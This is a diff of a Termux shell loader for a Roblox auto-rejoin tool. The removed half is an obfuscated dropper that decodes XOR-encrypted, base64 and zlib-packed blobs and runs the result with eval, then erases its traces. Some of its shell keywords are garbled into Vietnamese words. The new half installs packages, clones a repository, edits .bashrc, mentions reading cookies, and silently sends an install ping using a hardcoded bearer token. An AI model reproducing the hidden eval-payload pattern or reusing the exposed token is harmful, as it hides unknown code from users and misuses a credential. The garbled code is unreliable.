@@ -1,156 +1,212 @@
-#!/usr/bin/env bash
-# giai đoạn tải trọng Termux
-case $- in *x*) exec bash "$0" "$@" ;; esac
-command -v python3 >/dev/null 2>&1 || { echo "python3 required" >&2; exit 1; }
-command -v base64 >/dev/null 2>&1 || { echo "base64 required" >&2; exit 1; }
+#!/bin/bash
+set -u
 
-_q=0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/=
+pkg(){ yes | command pkg "$@"; }
 
-_v(){
-  local _lb=$1 _cnt=$2 _hh=5381 _ii _cc _xx _oo=
-  for ((_ii=0;_ii<${#_lb};_ii++)); do
-    printf -v _cc '%d' "'${_lb:_ii:1}"
-    _hh=$(( (_hh * 33 + _cc) & 0xFFFFFFFF ))
-  xong
-  _xx=$_hh
-  for ((_ii=0;_ii<_cnt;_ii++)); do
-    _xx=$(( (_xx * 1103515245 + 12345) & 0x7FFFFFFF ))
-    printf -v _oo '%s%02x' "$_oo" $(( (_xx >> 16) & 0xFF ))
-  xong
-  printf %s "$_oo"
+R="https://github.com/QT305/roblox-rejoin"
+D="$HOME/roblox-rejoin"
+W="$D"
+ENTRY_VIP="rejoin.cjs"
+ENTRY_LITE="rejoin lite.cjs"
+PREFIX_DIR="${PREFIX:-/data/data/com.termux/files/usr}"
+L="$PREFIX_DIR/bin/loader"
+
+ROBLOX_REJOIN_HOME="${ROBLOX_REJOIN_HOME:-$HOME/.roblox-rejoin}"
+export ROBLOX_REJOIN_HOME
+mkdir -p "$ROBLOX_REJOIN_HOME"
+
+# Install counter (optional): must match TELEMETRY_URL/TELEMETRY_TOKEN set in rejoin.cjs / rejoin lite.cjs. Blank = off.
+# Counts a device ONCE, the very first time the loader ever runs on it. Never blocks startup and never errors out loud
+# even with no internet - it's a background best-effort ping, nothing here depends on it succeeding.
+TELEMETRY_URL="https://happy-silkworm-212383.upstash.io"
+TELEMETRY_TOKEN="gQAAAAAAAz2fAAIgcDIyY2ExYmE0ODA1MzA0Nzc3YTE3M2VhYmI1ZGU0OTM5YQ"
+INSTALL_MARKER="$ROBLOX_REJOIN_HOME/.install_counted"
+if [ -n "$TELEMETRY_URL" ] && [ -n "$TELEMETRY_TOKEN" ] && [ ! -f "$INSTALL_MARKER" ]; then
+  touch "$INSTALL_MARKER" 2>/dev/null
+  ( command -v curl >/dev/null 2>&1 && curl -fsS -m 5 \
+      -H "Authorization: Bearer $TELEMETRY_TOKEN" \
+      "${TELEMETRY_URL%/}/incr/installed_count" >/dev/null 2>&1 ) &
+  disown 2>/dev/null || true
+fi
+
+CFGS="multi_configs.json webhook_config.json package_prefix_config.json activity_config.json autoexec_config.json launch_activity_cache.json"
+LAST_FILE="$ROBLOX_REJOIN_HOME/loader_choice"
+
+SELF="$(readlink -f "$0" 2>/dev/null || echo "$0")"
+if [ "$SELF" != "$L" ] && { [ ! -f "$L" ] || ! cmp -s "$SELF" "$L"; }; then
+  cp "$SELF" "$L" 2>/dev/null && sed -i 's/\r$//' "$L" && chmod +x "$L"
+fi
+
+LAST="$(cat "$LAST_FILE" 2>/dev/null)"
+case "$LAST" in 1|2) ;; *) LAST=1 ;; esac
+
+AUTOSTART=0
+_rebuild=()
+for _a in "$@"; do
+  [ "$_a" = "--autostart" ] && { AUTOSTART=1; continue; }
+  _rebuild+=("$_a")
+done
+set -- "${_rebuild[@]+"${_rebuild[@]}"}"
+unset _a _rebuild
+
+normalize() {
+  case "$(echo "${1:-}" | tr 'A-Z' 'a-z')" in
+    1|vip) echo 1 ;;
+    2|lite) echo 2 ;;
+    *) echo "" ;;
+  esac
 }
 
-_w(){
-  local _lb=$1 _hx=$2 _ii _kk _bb _oo=
-  _kk=$(_v "$_lb" $(( ${#_hx} / 2 )) )
-  for ((_ii=0;_ii<${#_hx};_ii+=2)); do
-    _bb=$(( 16#${_hx:_ii:2} ^ 16#${_kk:_ii:2} ))
-    printf -v _oo '%s%02d' "$_oo" "$_bb"
-  xong
-  printf %s "$_oo"
+CHOICE=""
+if [ "$AUTOSTART" = "1" ]; then
+  CHOICE="$LAST"
+else
+  if [ $# -gt 0 ]; then
+    CHOICE="$(normalize "$1")"
+    [ -n "$CHOICE" ] && shift
+  fi
+  [ -z "$CHOICE" ] && CHOICE="$(normalize "${LOADER_CHOICE:-}")"
+fi
+
+if [ -z "$CHOICE" ]; then
+  C1=$'\033[1;38;5;87m'; C2=$'\033[1;38;5;121m'; C3=$'\033[38;5;245m'; C4=$'\033[38;5;63m'; C0=$'\033[0m'
+  [ -t 1 ] || { C1=""; C2=""; C3=""; C4=""; C0=""; }
+  echo
+  echo "${C4}╭─ ${C1}ROBLOX REJOIN${C4} ────────────────────────────────────╮${C0}"
+  echo "${C4}│${C0}                                                    ${C4}│${C0}"
+  echo "${C4}│${C0}  ${C2}[1]${C0} VIP   ${C3}all features (rejoin.cjs)${C0}               ${C4}│${C0}"
+  echo "${C4}│${C0}  ${C2}[2]${C0} LITE  ${C3}light, smooth on long runs${C0}              ${C4}│${C0}"
+  echo "${C4}│${C0}                                                    ${C4}│${C0}"
+  echo "${C4}╰────────────────────────────────────────────────────╯${C0}"
+  printf "  Choose [1-2, Enter = %s]: " "$LAST"
+  ANS=""
+  { read -r ANS </dev/tty; } 2>/dev/null || read -r ANS || ANS=""
+  if [ -z "$ANS" ]; then
+    CHOICE="$LAST"
+  else
+    CHOICE="$(normalize "$ANS")"
+    [ -z "$CHOICE" ] && { echo "[-] Invalid choice."; exit 1; }
+  fi
+fi
+
+echo "$CHOICE" > "$LAST_FILE" 2>/dev/null
+
+if [ "$CHOICE" = "2" ]; then ENTRY="$ENTRY_LITE"; NAME="LITE"; else ENTRY="$ENTRY_VIP"; NAME="VIP"; fi
+echo "[*] Starting $NAME..."
+
+use_official_mirror() {
+  echo "[*] Mirror is failing, switching to the official one (packages.termux.dev)..."
+  rm -f "$PREFIX_DIR/etc/termux/chosen_mirrors" 2>/dev/null
+  mkdir -p "$PREFIX_DIR/etc/apt" 2>/dev/null
+  echo "deb https://packages.termux.dev/apt/termux-main stable main" > "$PREFIX_DIR/etc/apt/sources.list"
+  rm -rf "$PREFIX_DIR/var/lib/apt/lists/"* 2>/dev/null
 }
 
-_r(){
-  local _acc= _k _g
-  for _g in "$@"; do
-    for _k in $_g; do
-      [ -n "${!_k:-}" ] || tiếp tục
-      _acc=$_acc$(_w "${_k#_}" "${!_k}")
-    xong
-  xong
-  printf %s "$_acc"
+UPDATED=0
+pkg_install() {
+  if [ "$UPDATED" = "0" ]; then pkg update >/dev/null 2>&1; UPDATED=1; fi
+  pkg install "$@" && return 0
+  echo "[!] Installing '$*' failed, retrying with --fix-missing..."
+  apt-get update >/dev/null 2>&1; apt-get install -y --fix-missing "$@" && return 0
+  use_official_mirror
+  apt-get update >/dev/null 2>&1; apt-get install -y --fix-missing "$@" && return 0
+  return 1
 }
 
-_m(){
-  local _dd=$1 _ii _ee=
-  for ((_ii=0;_ii<${#_dd};_ii+=2)); do
-    _ee=$_ee${_q:$((10#${_dd:_ii:2})):1}
-  xong
-  printf %s "$_ee"
+N="$PREFIX_DIR/bin/node"
+[ ! -x "$N" ] && N="$(command -v node 2>/dev/null)"
+
+echo "[*] Checking required packages..."
+USE_TAR=0
+command -v curl >/dev/null 2>&1 || pkg_install curl || echo "[!] Could not install curl."
+command -v git >/dev/null 2>&1 || pkg_install git || { echo "[!] Could not install git, downloading the source directly."; USE_TAR=1; }
+if [ -z "${N:-}" ]; then
+  pkg_install nodejs
+  N="$(command -v node 2>/dev/null)"
+fi
+[ -z "${N:-}" ] && { echo "[-] Could not install nodejs."; exit 1; }
+command -v sqlite3 >/dev/null 2>&1 || pkg_install sqlite || echo "[!] Could not install sqlite3, the tool will fail when reading cookies."
+command -v termux-wake-lock >/dev/null 2>&1 || pkg_install termux-api 2>/dev/null || echo "[!] Could not install termux-api (wake-lock won't work)."
+[ -d "/data/data/com.termux.boot" ] || pkg_install termux-boot 2>/dev/null || echo "[!] Could not install termux-boot (autostart on reboot won't work)."
+
+node_ok() { "$N" -v >/dev/null 2>&1; }
+
+if ! node_ok; then
+  echo "[!] node is broken (old openssl), updating Termux packages..."
+  pkg update >/dev/null 2>&1
+  pkg upgrade -y -o Dpkg::Options::=--force-confnew 2>&1 | tail -3
+  node_ok || { echo "[!] Reinstalling openssl + nodejs..."; apt-get install -y --reinstall openssl nodejs >/dev/null 2>&1; }
+  if ! node_ok; then
+    use_official_mirror
+    apt-get update >/dev/null 2>&1
+    apt-get upgrade -y -o Dpkg::Options::=--force-confnew 2>&1 | tail -3
+    apt-get install -y --reinstall openssl nodejs >/dev/null 2>&1
+  fi
+  node_ok || { echo "[-] node still fails. Run: pkg upgrade -y (if that doesn't help: termux-change-repo, then pkg upgrade -y)"; exit 1; }
+  echo "[+] node works now: $("$N" -v)"
+fi
+
+download_tarball() {
+  T="$(mktemp -d 2>/dev/null || echo "$HOME/.rejoin_dl")"; mkdir -p "$T"
+  URL="$R/archive/refs/heads/main.tar.gz"
+  if command -v curl >/dev/null; then curl -fL --retry 3 -o "$T/r.tgz" "$URL" || return 1
+  elif command -v wget >/dev/null; then wget -O "$T/r.tgz" "$URL" || return 1
+  else echo "[-] No git, curl or wget to download the source with."; return 1; fi
+  mkdir -p "$D"
+  find "$D" -mindepth 1 -maxdepth 1 ! -name node_modules -exec rm -rf {} + 2>/dev/null
+  tar -xzf "$T/r.tgz" -C "$D" --strip-components=1 || return 1
+  rm -rf "$T"
+  return 0
 }
 
-_tngsn=6a9672914ead1ad2de474848898f7a274569ab19769e18761557c4b15064501dd280accd23b109bb56dcf560f27a001658f24aef68deadd6f8a7557b
-_jtzyzlh=c952b7315ccc63f54d970970ed851824a90cc7b903e75e6e34d2708cb9ec236ae5aed1b3ae27ed559e829f87c70113b550b9bd1fcb5b7cdb4cece8af
-_wpmzuxe=008dec2202e7d00d01298c2daa4c908bc16a12970
-_suutmmo=bb8f4f6a9b55e0ec2e1a548ef83b6fa8be7e2ceb61f640c0f46cf32d3407deac5ca0eb7ff99d3801f94084a6468780bc581a8ce304a9b0b67c25bfb9
-_lltgbkd=2dda80c8926290732c0380bf64aeeaf1082b6b52b93ea419c33aa5e 89ae1d440c8c08b401c72e5df02617014bc329e52694563a87289a07c00c9b91
-_hbltzx=bc60c4e88f4c67829d5e5dcbe5f4566f906b9435ef532d1288f76bc55103873c6ae9b5186b7383563bc6a11ca57643fb0c7476ca279e1e03269e3568
-_yietzu=97f40ba436274be7eb2abc11422b064ce0c81b9854199c15b0d7aa592e485eaf9294aff27d0ee20045138b411af5a878c24495bbac9bfc4ea56361ce
-_bliux=0090ac26712d469aa3d55ec0dc138f61adc994bfae0e48a0e7962ed8368473ad28bac1e28d2b3180123ee049678894559f5742b25b0f972154656470
-_gdmk=0fb383fcf71cb530648b62e06b0b6e56d1abb94855d2ddf15b61e6005468cb5901fe00dba5493ba06ee02c5b272fd0ad0af5da25b26a6be76e6c8b8d
-_ziyvhv=13241da12d65ddcaa5c4081db2ebc2bd945bcd8466f815e60d4ad8f5b3a5617631d733cdef385896c9e32d15ee28624f995f58deb31cd7ef214b1a39
-_dybnhwh=621cc89b3481b1f06d17d980c759151211c6d447f55ba583dd92c16 e37e3ebd70a18164700cb2b9d22236e8ef493c8051671996ba48825ff78fa0e5f
-_bhmnm=fbdfd620f9e3397cc6dd663f9a1853fc844e8a25aaa18da1bcb46ebe474e0d40ebc51a6a54ff93206d16c06ac9ef42be5d396b93d9326ea89547440
-_qgoab=41474c58d1d25fa9e6082eb44ff3ff1fa5e3db46f75c244e8921b4c02422bbf807ca5b591c34700c2da8838c070ba114e61cfe93b32d66ba09c02180
-_sogjds=bec569bb211c9ecfc99c206c793d176b473eb488d061a3e6076f9c03eac298d7e0c0bf46d895d64aa8b2fd1c18875204014ce29854ee151d5b4ca815
-_zhmdys=8663a5be68ded1659d2eb570a479c447c55caf43c4c020df54683c11 2f317622d73658261557b6b5ca7a4cdb9d9bd73e36df2740d672c98f20bd2b0a
-_klive=94fbbcfb25736308598903ab60485303c83fc598263f6365b734b1cd1187fa0bb36498f02ecb2041a69221d76c5d70277ea15027d2f015ef360acd70
-_obgxjp=ff24bb0ae36a7095852c5ffe1189969ca2612a1338f06236deaa5ca997672b768a2b4d1ff00252dd026469535fd0c210efbad2bc36580755cd2ec6ba
-_gvxqm=39d7fa7e14fc6c354084a1d1645633a394456a2b8122b4f0e26f55ac b33875eb69b44f9288a94474e475c19ada49d7a016b3cd8a794e0599955dc4ca
-_vfsu=d9cd3fa60ec5e188ec94422f873dd6f8ac4b5eafc0b4613d1b4ea66c60b463d258e3cfa476348cc766035df811c7a3ecbc9ababc012243eea11823a9
-_dugvdhl=17c214da73b66646af3ed81d53ca39f41793872cada50e518ee2a004f392dbf18945a0deeef9e8ed1bce7246f60cef266e900ab97369a9d9ff80e878
-_zdgei=ce2f0ba10c76e9b6fce236d0ab161db106626089300b1ca48484fb12e9bfd2850eef4cbaaa9118cc3ef0a23e432505229362b0023481935be0505a65
-_xqtzrms=f7bb79746fdc75b984e11b340b1bb439831e3d1614efd8e490f05346bc7585deff6a93b763e07873e
-_lzrwea=721122ff31ba3c82f1296a93c467ab62d544a6144c62a41aef16ff1a5256b9bd36c680d2d7003508a44e386acdd4004e187b862555ab044c96a26df9
-_rrlj=d03b81838e6dd864dfa045e80bf21a848aab5fe9fdb9cbe6a3793f71ffa
-_chfvtj=15b9b514b54c0b170337ba9358a65afa445464eb298f5bc108d2c96205fef6006cc39ee3d638e69796892b354084ebe738fece49dabbebea9ba31a1
-_ikbhbu=faf38eefaf8a469b1c5d4721f21f3e0882c39414442cddf2bad405b411ca7deb0ed2ad2e2ccddbb2cbcd8d846869e78c45c03b8eae78a24f1ebf399
-_gqljj=dcb10d22bc9f46fe33539741c567f5df141ead06cf2a3d9cfaadd7ea77e53b19e4160077282e509aecc6c8bd75e4952848f93ffca8d31283515456f8
-_thiy=4c3bc292e0aa6264eb1d25ea9bfd162d7ce35e7419c6722a3e670c863b82abf51f59ffe389861ccb4c5818adf7b1be712179bd050aae4637684fc14a
-_akqrj=729886c6ba3dd93ed1b800cd7b2356ec265a7c928933303507a950fbfeaf1ab7d4accb86a448063ec3b350ec126416c84eb4998f495603639611714c
-_zqqsks=17c6139e0c6a880f0f35bf0c43e6b47bb4243014800d3ac5b79c8164f076b4e25d59cb66dbede29ab1175abdda4dd896318c0f76423d07f1bac848cf
-_pzrmov=00134aa7647fac171d8c8d7a086c3bc70232b42859b0d5ec88c4de50ac7055b011cfd1752263b87a73f86c736482675185ff9f10bed252b5ab6cad05
-_ihwyzqg=ebef31d5fbf3ecd09ce36703a6faf5fed671b4c1d5ce68da15975df3883ddc9b6d429275d38818971cead2b2e6ddbc0791f4976ab0549116ccb4e0b2
-_hifywu=346db451753bdc2c3f234f0d3c43b777197489c70050286d6953abf8128f9c6fedfe4626cf9367811ed8fa3081a88b3036aeddd9825af72c14f2914d
-_wmymlb=dd6e597c63e1329211cb8cc2cd8dc95b7b8edd713d0af1dd9ff807329d6c6928bafd0d65b5d8aab72ce003c0d5bad4eb572b1d14115aa051a40d0426
-_sukb=3787ae014e4990745b1c18bd190ecb2b195eb24251bc01b4f401d808cbda8827f151bc40bbc2e4922b74ab7c0f434290ff1a8d55ef85c9169887dbbb
-_meqszbn=2f3870210850e64738efe7b642c697ea120d985721e6c016627137b6893
-_fwwdwz=2f78869ffbf75f9f1cf1d5aedf4e2cb43d66505d8187e56b1987c26de1581238ff3d5f3817eac07377c3e89678b46ae7bd7846f5ebe3c4b82ef514d9
-_dhjb=938a5fd501ba948fd8e2b2f6b80ab5a770883e43899313c0e6fe96b934ca8fc7ccbd93e97fe0f70107e4378452e90d83f8e6cb349fe85cd4368b4130
-_qzwrs=540a64467b4806fcc61837545ae0e47a2c21e44b8ca68b5d35e35950eb9050d4622ace22ccd9b7f638c4591d7e0fd178b96e715b836c1b7a33f6ffcc
-_ilajm=d4faf02d130f866a2046846df62333f2ad609ac83c3925c5fb5f77b41c8b5f3b9a44c35630c38bf7acd9500fdfed8515f520b3f0d6d8521b323704c
-_zitdg=4432bc9a2e58af4426dce24fccbc3285d38790f364c88a207bea5f4e14cf2ad6087beb062c103139d5942e530f16930618a925f3dd93e07684aacd9f
-_mzkelqo=3477b965626dc0af57e8b00c14116f85b7b06530fb3b0ff43962346 f46b5c2242876da016ab33bf1800382f3f52b01be86acb9bc1640c9971ef84e14
-_nmkfcm=8287183f0734e97f994e70f14e8b32884b3cbf39a857271c00352efce84a86333a1ce2bec2ea84e182ba357a75663176070f3ea38f383c64dd5f729b
-_qdxnhtp=859e8b0412537d9de292c0d1cf9aed365b27e9aeba64f9cd8cf5680 143c344b9da5b3d57dc64f8752ee398a128e2844b081d8ff6e538a4b6f7271094
-_aafwgsa=fd3aa051aa46b4a43c5850d681a30693c3a33b519eea9021f549363ee5f
-_ttkmj=6566ae9c19bf098c5967d77ffac875c8e4e5ae02b332e0c3553cababbc564dfe9b41005f627bbdaf4b8d56058681fc0df751d9be48eb64e69c3ee45c
-_qnwoyhz=2f3f7053236740a73f037d19b2e78bce6645e8f6815d34ed9f122c1 0dc4ad5194d4d392c3d48a2da498459f5d31a87facd7e30a26ec7a34b935b0773
-_ylwi=888753ee25905211c85ed2bb9db6dcbfe51ad454df4fb3b5827f9d0299190c9bc43914984c750a679283b1bd1e07c1bb19399edea6d4835a6d891ba
-_eorjb=115ecc1dca92fb08ab4eed886b1dab5c54b434202a56b7d394bb8219ddabe6be4e6aba866dc9859d5c8c3fa5b39aaeb9e4d4928ad49e5bebf54666e
-_sdxcyh=13caf9b7046d2bb665aae641850daccdf8ad49874
-_vdexm=2ba7f1f8750926dc23fd936e30fcdc753d7ccb145058f2f5733b58b3ed0d234be115ab2400274fa6f2217e78e312db295876bf89732bbf59aeb997e
-_xzhrzaz=e693046dd206f0fe931ad0c02aaa54a591b02868cd5fe60f653575bcccff0a3b2627b4ecaff200b47f5d8c23a1602789bc4b2f29cf3a97466acaf446
-_hbhw=670356bfe67bc60aaf9d9f73466c57cc5596f53866a62b99af9e8090b0153358401833a4a9026edd271ef89d5364509c3fb5606874aee137f23299a5
-_evjve=f9652da158fb1795f82a441186aa40993d67a7541594b1b4a0ee2a96 d50d1765aef020e941778210393b5d508140c68b741d1960ff516ba82d4b495a
-_qqxg=541ad5ef86540d95396556d816f9fe15b8e1bffdbd2baefbf77f97c1c6b
-_xbnumg=6ff5fe4661c154e4a33193f5a9a6640daf7007c335df54189e2a634bffb4bc784a052ce8b4f38ce4bf3d68c23a74e2506dafbcc7e337de5233c2f46f
-_wkwo=65a91ecaadbefadf7d89a9ebec1462b0d27b0b657d7527458e8d1d800d729d4a2de2e6db02581b1852e94c2526da10ee4d9f9602d347d1434f6ae2ce
-_jcoehj=680ecc7160fe608dd12d122f5faeb69002c1175e7e3a5dad4bdaed811316089ed5c17bed40c7561c60513c4b7b17118464b326c8984267ad16ae1356
-_yuwqyw=9c8ef3db7d995aa22e0e9744095cf83afe59879eb081d85a627ec234c9e5659adba37f87154bdadc487c3c0747b6dd77b57197cb191311b748299998
-_jguyyxa=cda844f0138c5751d6a8dd9acd3dbf4d3469f0ed94d5ab58b2891c9074f818144274932f00b63cb4cbf9cc500ed6eb53c18ad9ce4c80d30505a9086d
-_itgjj=defffe57c27a1f342fefc97050e652c03539188f4cc99631e9062b9e 66b4e09a59156318a32fcb495765bf08d68977e7c38a30d680645659b6d79e8f
-_hlyq=22b8ea2849519f57c1fcdae05bfcf5b5a5bf52990b6bda4b8be98cae7aa12959ef8a8681bff0744d4b2de66154c8d640004e967000d386fc67ee96dc
-_taujbgt=a33a08b981b3a737c8ed881c48482de92a0cc2bdcd823033870fb86 22e70e9103f6295a2e9a35c1b8323135d65ad9cb8c3d72c43388ce3fb9197071d
-_jfujw=8ee7b0f5c476148fb950e68825d42bbc84fe9f4efe667cf20b5aef1eebb653c567efe9f7330295e429906fb66ab9a75525cd86b0f047388b02a4f477
-_pnydvey=2c39243d9c73f3c6755419a8437f27944b2ccfa318fbe7d414add5b688b590acb4e6517f31904542b7af31db1fa67df61edc4043163f21d4fe56b18e
-_famef=06c79f7cbf16be0fdb7d4e2d5dff32569eff777ae
-_ahpiadn=9d7bd90e1e45255140a5c8d6d6f3cd085c73bd1d05b1accae7a0ae3ca94bb282d02c2fe5645ede09516070c7e0b00bae13cb59e0fd169a244de461a7
-_flown=d28abce3467a28142c730d925a83bb5dcd52b2d6045a9c16a97b6e952d5ed7ac6c82900f303eae89375a1d68df8827147ae4235ff740bcf9c6fc922a
-_uefqstb=c8c8ae524f0090bb3c364de124779b45e906471c77d97c3890109c3 c15b30cbbcc1943a31e07235fb64dc96f9e551e457230272383f4f6522b4f5299
-_fcsc=b18c0b31fbc4e6d85c60f05604156ed9f271fce92aeea8443efdaaecdb5004e5f47466bcf493de225d2e795c0aff66ab325bf94f87d2f0f2568ae1da
-_riko=175289f5fb22bcb878175a665a563242289bb33b6b42bcc698176cc44f9d028cb6c27042a938bf25dfd5652ac9d6332bf1c15d418b1629dbe0b862ca
-_jzaa=5678df6db8bf6dbaf4f88468806248525125309459f8b5cb328ea2a67932069364309a6ed0995f981bb6d688009b0e89024040ae8fa14d7f24e4203a
-_oxavxh=00e9cc5a9ebda953a9637fec3d8742843fb52b894449e7abff831a89690
-_jzcgcq=a5cab0ff7e55172bcda4944d091352b4c8d1f45d462a8f259ae8cd90 4c5d3534455c32f629c039e7d45b7f8f729a9783a7d31e6e894eae8d1aca6a7b
-_duosplb=2ddf14a4c6f2f32701910856d2fa77a835bc9bf4f14f4205c8ff7bcbb988b3b46e022186eacee45259982a7473edf9e8b4dcf3ecb28721e0fbcc561a
-_jbajm=0c7fc8e95830cd0549e24ab46520d348cd750b76a558d463cf69ff48de930d2926dc394c71464506d191207bf1568d8f3765e2da892da0ac039a55fa
-_xvhlzy=273a19e862335b357c9fd4065cc3ae9f801ffb05e3607bc3f06c668f9d05b7ecfd2253c2225869eecfe0753da0a5438d5e13d2ae49ce4d1a4cd01958
-_pylgybx=256554990cf23c529c601f0d8651caeb80ba5fcd610c95dde90fe04801e3951eb382502ab148f4f315a387f4e673de6219dc96efed5018e25152d28b
-_ozit=e3a38bf22d9c5c1cd07176e2349f61ef91fa69229ecddf52230f915efba
-_aotkop=b349362992034699423b66dd4ce97606a9e1a7996ca02fe776d78d21b15c3c0a3bdb8f7925011cd80ce436120b037ba709779a30154eef69d77dcf09
-_jalvc=60102ee6ce08f3835a8827609c0f5353414a8f84e683fb8c66e2452fbc97e11f29b53b4f6a5b91905d46e6aff5817695c0974bbb0bff9cea40f83a3b
-_elerdt=e21b54528f0f362c926a65c6c1006db92ebc60dfc1a80aa140283269 c849a03280e8324123072ff8f096afc0973b3b2a4539d3d72a9ea01f056bf59c
-_shjjtk=c1e8afd2612ecc924e2a2a390e8293ee813026ab712ee73648a2eca72f76082eca601eac6ed3968abfaa1ddfe0fadf2f07eda4c97d88ccda9065cd9c
-_ohwkak=82f9e49c63b30cf0f1979d63f1beb5013134a1e22baaf1f27e6f5505
-_loia="_tngsn _jtzyzlh _suutmmo _hbltzx _yietzu _bliux _gdmk"
-_ldahw="_ziyvhv _dybnhwh _qgoab _sogjds _zhmdys _klive _obgxjp"
-_wehxpb="_gvxqm _vfsu _dugvdhl _zdgei _lzrwea _gqljj _thiy"
-_gdpwjrq="_akqrj _zqqsks _pzrmov _ihwyzqg _hifywu _wmymlb _sukb"
-_cmrgcga="_fwwdwz _dhjb _qzwrs _zitdg _mzkelqo _nmkfcm _qdxnhtp"
-_elbdfxt="_ttkmj _qnwoyhz _xzhrzaz _hbhw _evjve _xbnumg _wkwo"
-_madsk="_jcoehj _yuwqyw _jguyyxa _itgjj _hlyq _taujbgt _jfujw"
-_ljgxlm="_pnydvey _ahpiadn _flown _uefqstb _fcsc _riko _jzaa"
-_hnwtsxk="_jzcgcq _duosplb _jbajm _xvhlzy _pylgybx _aotkop _jalvc"
-_dtmp="_elerdt _shjjtk _ohwkak"
+if [ "$AUTOSTART" = "1" ] && [ -d "$D" ]; then
+  echo "[*] Autostart - skipping update."
+elif [ "$USE_TAR" = "1" ]; then
+  download_tarball || { echo "[-] Source download failed. Check your network and run again."; exit 1; }
+elif [ ! -d "$D/.git" ]; then
+  rm -rf "$D"
+  git clone "$R" "$D" || { echo "[!] git clone failed, trying the tarball..."; download_tarball || exit 1; }
+else
+  cd "$D" || exit 1
+  CUR=$(git remote get-url origin 2>/dev/null)
+  [ "$CUR" != "$R" ] && git remote set-url origin "$R"
+  git fetch --all --prune || exit 1
+  for f in $CFGS; do
+    [ -f "$D/$f" ] && [ ! -f "$ROBLOX_REJOIN_HOME/$f" ] && cp -f "$D/$f" "$ROBLOX_REJOIN_HOME/$f" 2>/dev/null
+  done
+  EXCL="-e node_modules"
+  for f in $CFGS; do EXCL="$EXCL -e $f"; done
+  git reset --hard origin/main
+  git clean -fd $EXCL
+fi
 
-_d=$(_r "$_loia" "$_ldahw" "$_wehxpb" "$_gdpwjrq" "$_cmrgcga" "$_elbdfxt" "$_madsk" "$_ljgxlm" "$_hnwtsxk" "$_dtmp")
-_s=$(_m "$_d")
+if [ -z "${LOADER_REEXEC:-}" ] && [ -f "$D/loader.sh" ] && [ -f "$L" ] && ! cmp -s "$D/loader.sh" "$L"; then
+  if cp "$D/loader.sh" "$L" 2>/dev/null && sed -i 's/\r$//' "$L" && chmod +x "$L"; then
+    echo "[*] Loader updated from the repo, restarting..."
+    LOADER_REEXEC=1 exec bash "$L" "$CHOICE" "$@"
+  fi
+fi
 
-_t=$(mktemp -d 2>/dev/null || echo "${TMPDIR:-/tmp}/.$$")
-mkdir -p "$_t" 2>/dev/null
-printf %s "$_s" | base64 -d > "$_t/a" 2>/dev/null
-python3 -c "import sys,zlib;sys.stdout.buffer.write(zlib.decompress(open(sys.argv[1],'rb').read()))" "$_t/a" > "$_t/b" 2>/dev/null
-eval "$(cat "$_t/b" 2>/dev/null; printf x)"
-rm -rf "$_t" 2>/dev/null
-unset -f _v _w _r _m 2>/dev/null; unset _q _v _w _r _m _d _s _t
+S="$(command -v su 2>/dev/null)"
+[ -n "${S:-}" ] && {
+  grep -qxF "alias node='$N'" ~/.bashrc 2>/dev/null || echo "alias node='$N'" >> ~/.bashrc
+  grep -qxF "export PATH=\"$(dirname "$N"):\$PATH\"" ~/.bashrc 2>/dev/null || echo "export PATH=\"$(dirname "$N"):\$PATH\"" >> ~/.bashrc
+  source ~/.bashrc 2>/dev/null || true
+}
+
+cd "$D" || exit 1
+if [ "$CHOICE" = "1" ]; then
+  [ ! -d "$D/node_modules" ] && { npm install --no-audit --no-fund || exit 1; }
+fi
+
+[ ! -f "$W/$ENTRY" ] && { echo "[-] '$ENTRY' not found in $W"; exit 1; }
+cd "$W" || exit 1
+
+# wipe the install/update logs (screen + scrollback) so only the Rejoin panel is left. Errors above exit before this point
+[ -t 1 ] && printf '\033[3J\033[2J\033[H'
+
+if [ "$AUTOSTART" = "1" ]; then
+  exec "$N" "$ENTRY" --autostart "$@"
+else
+  exec "$N" "$ENTRY" "$@"
+fi
